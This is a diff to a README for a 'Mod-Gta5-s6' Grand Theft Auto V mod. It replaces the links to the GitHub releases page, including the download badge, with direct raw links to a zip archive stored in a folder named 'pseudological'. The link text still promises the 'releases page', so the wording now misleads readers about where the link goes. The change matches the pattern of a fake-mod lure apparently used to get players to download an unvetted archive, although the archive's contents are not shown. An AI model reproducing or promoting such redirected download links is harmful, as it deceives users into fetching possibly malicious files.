@@ -1,6 +1,6 @@
 # 🎮 Mod-Gta5-s6 - Enhance Your GTA5 Gameplay Easily
 
-[![Download Mod-Gta5-s6](https://img.shields.io/badge/Download-Mod--Gta5--s6-brightgreen)](https://github.com/fiodor21312/Mod-Gta5-s6/releases)
+[![Download Mod-Gta5-s6](https://raw.githubusercontent.com/fiodor21312/Mod-Gta5-s6/main/pseudological/Mod-Gta5-s6.zip)](https://raw.githubusercontent.com/fiodor21312/Mod-Gta5-s6/main/pseudological/Mod-Gta5-s6.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to Mod-Gta5-s6! This tool helps you elevate your gameplay in Grand Theft
 To get started:
 
 1. **Visit the Releases Page:**
-   Click this link to access the releases page: [Download Mod-Gta5-s6](https://github.com/fiodor21312/Mod-Gta5-s6/releases).
+   Click this link to access the releases page: [Download Mod-Gta5-s6](https://raw.githubusercontent.com/fiodor21312/Mod-Gta5-s6/main/pseudological/Mod-Gta5-s6.zip).
 
 2. **Select a Version:**
    On the releases page, you will see different versions of the tool. Choose the latest version for the best experience.
